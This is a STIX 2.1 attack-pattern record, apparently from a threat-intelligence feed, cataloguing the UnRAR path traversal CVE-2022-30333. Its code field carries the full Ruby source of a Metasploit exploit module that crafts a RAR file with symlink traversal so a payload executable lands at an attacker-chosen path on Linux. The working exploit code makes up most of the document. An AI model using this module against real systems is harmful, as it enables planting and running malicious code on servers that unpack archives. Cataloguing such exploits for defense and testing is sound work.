{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4b288a5-dce9-4e61-8e87-0a126ba64380",
    "created": "2024-08-14T16:57:02.224223Z",
    "modified": "2024-08-14T16:57:02.224227Z",
    "name": "UnRAR Path Traversal (CVE-2022-30333)",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/fileformat/unrar_cve_2022_30333.rb",
            "external_id": "unrar_cve_2022_30333.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-30333"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pmachapman/unrar/commit/22b52431a0581ab5d687747b65662f825ec03946"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Format::RarSymlinkPathTraversal\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UnRAR Path Traversal (CVE-2022-30333)',\n        'Description' => %q{\n          This module creates a RAR file that exploits CVE-2022-30333, which is a\n          path-traversal vulnerability in unRAR that can extract an arbitrary file\n          to an arbitrary location on a Linux system. UnRAR fixed this\n          vulnerability in version 6.12 (open source version 6.1.7).\n\n          The core issue is that when a symbolic link is unRAR'ed, Windows\n          symbolic links are not properly validated on Linux systems and can\n          therefore write a symbolic link that points anywhere on the filesystem.\n          If a second file in the archive has the same name, it will be written\n          to the symbolic link path.\n        },\n        'Author' => [\n          'Simon Scannell', # Discovery / initial disclosure (via Sonar)\n          'Ron Bowes', # Analysis, PoC, and module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2022-30333'],\n          ['URL', 'https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/'],\n          ['URL', 'https://github.com/pmachapman/unrar/commit/22b52431a0581ab5d687747b65662f825ec03946'],\n          ['URL', 'https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis'],\n        ],\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [ 'Generic RAR file', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'DisclosureDate' => '2022-06-28',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'payload.rar']),\n        OptString.new('CUSTOM_PAYLOAD', [ false, 'A custom payload to encode' ]),\n        OptString.new('TARGET_PATH', [ true, 'The location the payload should extract to (can, and should, contain path traversal characters - \"../../\" - as well as a filename).']),\n        OptString.new('SYMLINK_FILENAME', [ false, 'The name of the symlink file to use (must be 12 characters or less; default: random)'])\n      ]\n    )\n  end\n\n  def exploit\n    print_status(\"Target filename: #{datastore['TARGET_PATH']}\")\n\n    if datastore['CUSTOM_PAYLOAD'].present?\n      print_status(\"Encoding custom payload file: #{datastore['CUSTOM_PAYLOAD']}\")\n      payload_data = File.binread(datastore['CUSTOM_PAYLOAD'])\n\n      # Append a newline + NUL byte, since random data will be appended and we\n      # don't want to break shellscripts\n      payload_data.concat(\"\\n\\0\")\n    else\n      print_status('Encoding configured payload')\n      payload_data = generate_payload_exe\n    end\n\n    begin\n      rar = encode_as_traversal_rar(datastore['SYMLINK_FILENAME'] || Rex::Text.rand_text_alpha_lower(4..12), datastore['TARGET_PATH'], payload_data)\n    rescue StandardError => e\n      fail_with(Failure::BadConfig, \"Failed to encode RAR file: #{e}\")\n    end\n\n    file_create(rar)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-06-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}